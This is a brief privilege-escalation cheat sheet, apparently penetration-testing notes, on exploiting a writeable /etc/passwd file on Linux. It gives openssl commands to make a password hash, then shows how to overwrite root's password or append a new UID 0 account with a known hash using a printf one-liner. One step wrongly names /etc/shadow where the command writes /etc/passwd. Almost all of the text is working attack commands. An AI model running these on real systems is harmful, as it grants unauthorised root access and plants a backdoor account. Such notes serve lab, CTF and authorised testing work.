# Writeable /etc/passwd

#### Method 1 – Overwriting root password

```
openssl passwd -1 -salt "new" "123"
openssl passwd <newPassword>

nano /etc/passwd
```

### Method 2 – Creating a new user account

1. Copy the root user line, and paste it to the bottom of the /etc/shadow file.
2. Place a password hash that you control between the first and 2nd colon.

```
printf 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash\n' >> /etc/passwd
```
